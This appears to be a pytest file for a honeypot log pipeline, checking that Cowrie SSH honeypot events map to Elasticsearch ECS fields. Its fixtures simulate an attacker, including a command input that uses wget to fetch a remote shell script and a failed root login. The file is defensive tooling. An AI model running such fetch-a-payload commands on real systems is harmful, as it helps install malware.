import pytest

from app.es.bootstrap import PIPELINE_ID, bootstrap_es
from app.es.client import get_es

COWRIE_COMMAND_EVENT = {
    "eventid": "cowrie.command.input",
    "timestamp": "2026-08-20T10:15:03.421000Z",
    "session": "a1b2c3d4e5f6",
    "src_ip": "185.220.101.44",
    "src_port": 51234,
    "dst_port": 2222,
    "input": "wget http://198.51.100.7/x.sh",
    "message": "CMD: wget http://198.51.100.7/x.sh",
    "sensor": "cowrie-01",
}

COWRIE_LOGIN_EVENT = {
    "eventid": "cowrie.login.failed",
    "timestamp": "2026-08-20T10:14:58.100000Z",
    "session": "a1b2c3d4e5f6",
    "src_ip": "185.220.101.44",
    "username": "root",
    "password": "123456",
}


async def _simulate(doc: dict) -> dict:
    await bootstrap_es()
    result = await get_es().ingest.simulate(
        id=PIPELINE_ID, docs=[{"_source": doc}]
    )
    entry = result["docs"][0]
    assert "error" not in entry, entry
    return entry["doc"]["_source"]


@pytest.mark.asyncio
async def test_command_event_maps_to_ecs() -> None:
    src = await _simulate(COWRIE_COMMAND_EVENT)

    assert src["source"]["ip"] == "185.220.101.44"
    assert src["source"]["port"] == 51234
    assert src["destination"]["port"] == 2222
    assert src["session"]["id"] == "a1b2c3d4e5f6"
    assert src["event"]["action"] == "cowrie.command.input"
    assert src["event"]["category"] == "process"
    assert src["process"]["command_line"] == "wget http://198.51.100.7/x.sh"
    assert src["@timestamp"].startswith("2026-08-20T10:15:03")
    assert "message" not in src
    assert "sensor" not in src


@pytest.mark.asyncio
async def test_login_event_maps_to_authentication_failure() -> None:
    src = await _simulate(COWRIE_LOGIN_EVENT)

    assert src["event"]["category"] == "authentication"
    assert src["event"]["outcome"] == "failure"
    assert src["credential"]["username"] == "root"
    assert src["user"]["name"] == "root"
